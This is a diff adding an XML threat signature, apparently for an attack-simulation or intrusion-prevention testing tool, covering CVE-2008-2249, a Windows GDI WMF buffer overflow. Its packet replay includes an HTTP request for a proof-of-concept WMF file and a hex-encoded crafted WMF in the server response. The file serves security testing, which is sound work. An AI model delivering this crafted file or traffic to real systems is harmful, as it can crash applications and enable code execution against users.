@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Windows GDI WMF File HeaderSize Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a heap buffer overflow vulnerability in Microsoft Graphics Device Interface (GDI) library. The flaw is due to an integer overflow while handling WMF image files. A remote attacker can exploit this vulnerability by enticing the target user to open a crafted WMF image file, potentially causing arbitrary code to be injected and executed in the security context of the currently logged on user. An attack targeting this vulnerability can result in the injection and execution of code. If code execution is successful, the behaviour of the target will depend on the intention of the attacker. Any code injected will be executed within the security context of the currently logged on user. In the case of an unsuccessful code execution attack, the affected application will terminate resulting in the loss of any unsaved data from the current session."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS/IMAP/POP3/SMB/CIFS/SMTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_2000&amp;XP&amp;Vista&amp;Server_2003&amp;Server_2008"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-2249"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="58c01944ac745443448fe3a3a204d16c"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633995830226547512"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1263983403" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="L"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="M"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+    <for index="F">
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+    <for index="G">
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:60:4A:80" destMac="00:1B:78:75:79:68" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01CC" Identification="3FDC" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="57FA" srcIP="172.16.8.51" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1110" destPort="$HTTPdestPort" SeqNumber="D07ED436" AckNumber="64DA1B97" HeaderLength="05" WindowSize="FAF0" Checksum="0582" UrgentPointer="0000" Options="" Payload="474554202F7E686E61797961722F706F632E776D6620485454502F312E310D0A486F73743A203137322E31362E312E320D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F77733B20553B2057696E646F7773204E5420352E323B20656E2D55533B2072763A312E382E312E313729204765636B6F2F32303038303832392046697265666F782F322E302E302E31370D0A4163636570743A20746578742F786D6C2C6170706C69636174696F6E2F786D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C746578742F68746D6C3B713D302E392C746578742F706C61696E3B713D302E382C696D6167652F706E672C2A2F2A3B713D302E350D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174650D0A4163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,2">
+    <Output index="F" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:60:4A:80" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="51AE" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="8218" srcIP="$destIP" destIP="172.16.8.51" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1110" SeqNumber="64DA1B97" AckNumber="D07ED5DA" HeaderLength="05" WindowSize="1920" Checksum="68D4" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C2030392044656320323030382031383A31393A313420474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E32205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A205475652C2030392044656320323030382031383A31363A353720474D540D0A455461673A2022356534303233362D3436302D34356461313236313666383430220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20313132300D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20766964656F2F756E6B6E6F776E0D0A0D0A0100090000032804000004002C02000000001E02000040092000CC000000000010001000000000003CFBFFFF1000000010000000010020000000000000000000000000000000000000000000000000000000000000000000000000041911114C42353589564646A4503F3FA43023238604020243000000010000000000000000000000000000000000000000000000000000000009050516746565B0CDC2C2FFDFD5D5FFE2D2D2FFD2B6B6FFC19C9CFF9E7A7AFB2F20219E0000000E0000000000000000000000000000000000000000000000007160608FF2EFEFFFEFF1F1FFE4E4E4FFDAD1D1FFC3ACACFFA68D8DFFCA9F9FFFBB908EFF0C08084A000000000000000900000000000000000000000000000000907E7E9EFEFEFEFFFAFDFEFFECF0F1FFD8D0D0FFC5A1A1FFAF7F7EFFC69998FFC69896FB1009094E4B322A79756163EC0F0A097A0000001000000000000000004D3A3A22D4BBBBC3DDB8B8FEDFD0D8FFCEBCC2FFC58689FFBE6969FFCC8D8DFFBB9186F66C5B78FADDDAE9FFF7EDE7FFBCACB1FF554A4AD80B08084B00000000000000004731373EDC9056FDF1A548FFD79386FFC96B78FFC44C51FFE7A199FFCFB7C1FF118BFBFF89B5E6FFB87765FFAE8E92FFC1C0B2FF49413EAE00000000000000004A373D66F2A54AFFFFB40DFFFCA90BFFC38336FF964630FFA16D7BFF198EF8FF7BC8FAFFF7CBB3FFB78C88FFA17978FFB58A89FF4D3938A90000000000000000755B5A96FEBD57FFF8AD18FFBFA6B5FFF9FBF7FFF4EDB6FFA79683FF778B81FFF2AAA1FFE3C1C4FFB9888BFFC29090FFC38F8EFF4E3838A80000000003030403A1817ACEFFCD51FFBF902FFFFFFFFFFFFFFFFFFFFFFFE8FFFCEAB5FFBD5C0EFFDFA5A6FFDABDC1FFB98785FFBA8787FFC58D8DFF503737A8000000001614181DC8A693F3FFD15DFFC8A163FFFFFFFFFFFFFFFFFFFFFFFFFFFEF9D5FFA56D45FFD7B0B5FFDCBBBAFFB88586FFBB8A8AFFC28A8AFF513535A8000000003832374EDCBE9BFFFFD874FFE5C076FFFEEED8FFFFFF17FFFFFFFFFFFBF8F6FFB57547FFD8B3BCFFD8B3B2FFBD7878FFBA7D7DFFC18686FF523434A800000000615C6281E6C99CFFFFE787FFFFEBA0FFE3C49FFFE4AB92FFBC92BFFFE5CB83FFD49C6DFFD8BBC4FFE3CACCFFD99A9AFFCB7575FFCF7474FF573333AE000000009B979AC1CDBCAAFFD6C096FFE5D2A3FFF5EEBDFFF8F6C5FFFCF5B3FFFFF399FFDEAF95FFF4DDE1FFFBE9E9FFF5E1E1FFE3C4C4FDCA8D8DEC482B2B80000000007877776F979496B2A4999EDBB5A3A4F5BFA7A6FFCEB2A9FFD8BFA8FFE5C49AFFBE9287FE997C7EB97761618E514141642E25253B1111111503020202000000000000000000000000332F2F094D4646236356574B766466738E74789CB48E91D56046479A00000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="G" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:60:4A:80" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0041" Identification="51AF" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="87B2" srcIP="$destIP" destIP="172.16.8.51" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1110" SeqNumber="64DA214B" AckNumber="D07ED5DA" HeaderLength="05" WindowSize="1920" Checksum="F518" UrgentPointer="0000" Options="" Payload="00000000000000000000000000000F00000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
